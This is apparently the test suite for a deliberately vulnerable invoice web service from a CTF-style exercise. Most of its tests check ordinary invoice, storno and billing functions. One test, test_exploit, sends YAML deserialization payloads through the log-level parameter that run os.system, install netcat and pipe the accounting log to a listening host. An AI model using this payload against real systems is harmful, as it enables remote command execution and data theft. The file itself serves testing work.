from subprocess import PIPE, TimeoutExpired
import subprocess
import pytest
import requests
import logging
import json
import secrets
import docker
import os

logger = logging.getLogger()
URL = f"http://{os.environ['SERVICE_HOST']}:7354"

def test_invoice_landing_page():
    params = {'name': 'do-not-exist'}
    r = requests.get(URL, params)
    assert r.status_code == 200
    assert 'No Items' in r.text

def test_add_invoice():
    params = {'name': 'somebody', 'item': 'delicious-stuff'}
    n = len(find_accounted_invoices(guest_name=params['name'], item=params['item']))

    r = requests.get(URL + '/add', params)

    assert r.status_code == 200
    assert len(find_accounted_invoices(guest_name=params['name'], item=params['item'])) == n + 1

def test_storno_invoice():
    guest_name = secrets.token_hex(8)
    add_invoice_to_accounting_log(guest_name, 'something')
    invoice_number = find_accounted_invoices(guest_name, 'something')[0]['invoice_number']
    print('invoice_number')
    print(invoice_number)
    params = {'number': invoice_number}
    r = requests.get(URL + '/storno', params)

    invoices = find_accounted_invoices(guest_name, 'something')

    assert r.status_code == 200
    assert float(invoices[0]['amount']) + float(invoices[1]['amount']) == 0.0

def test_bill_requesting():
    guest_name = secrets.token_hex(8)
    add_invoice_to_accounting_log(guest_name, 'something')
    add_invoice_to_accounting_log(guest_name, 'something-else')

    params = {'name': guest_name}
    r = requests.get(URL + '/request-bill', params)

    assert r.status_code == 200
    assert r.json()['total'] == 19.98
    assert len(r.json()['items']) == 2

def test_setting_log_level():
    client = docker.from_env()
    container = client.containers.get('invoices')
    old_logs = len(container.logs().decode().splitlines())

    params = {'log-level': 'INFO'}
    r = requests.get(URL, params)

    latest_logs = container.logs().decode().splitlines()[old_logs:]
    invoice_logs = ''.join([line for line in latest_logs if 'invoice_controller' in line])
    assert r.status_code == 200
    assert 'INFO' in invoice_logs
    assert 'DEBUG' not in invoice_logs

def test_invoice_log_accounting():
    client = docker.from_env()
    container = client.containers.get('invoices')
    old_logs = container.logs().decode()

    add_invoice_to_accounting_log('someone', 'something')

    latest_logs = container.logs().decode().replace(old_logs, '')
    assert 'ACCOUNT' in latest_logs

@pytest.mark.exploit
def test_exploit():
    proc = subprocess.Popen(['nc', '-l', '7777'], stdout=PIPE)

    params = {'log-level': '!!python/object/apply:os.system [nc -h || ( apt-get update && apt-get install netcat -y )]'}
    requests.get(url = URL, params = params)
    params = {'log-level': f"!!python/object/apply:os.system [cat /InvoiceApp/invoices/accounting.log | nc {os.environ['TESTING_HOST']} 7777]"}
    requests.get(url = URL, params = params)

    try:
        stdout, _ = proc.communicate(timeout=3)
    except TimeoutExpired:
        proc.kill()
        stdout, err = proc.communicate()
        logger.warning(f'Waiting and listening to :7777 for exploit information ran into timeout. stdout: {stdout}, err: {err}')

    assert b'SECRET_ENO_TOKEN' in stdout

def add_invoice_to_accounting_log(guest_name, item):
    params = {'name': guest_name, 'item': item}
    requests.get(URL + '/add', params)

def find_accounted_invoices(guest_name, item=None):
    params = {'name': guest_name}
    r = requests.get(URL + '/request-bill', params)
    if not item:
        return json.loads(r.text)['items']

    invoices = []
    for invoice in json.loads(r.text)['items']:
        if invoice['item'] == item:
            invoices.append(invoice)
    return invoices

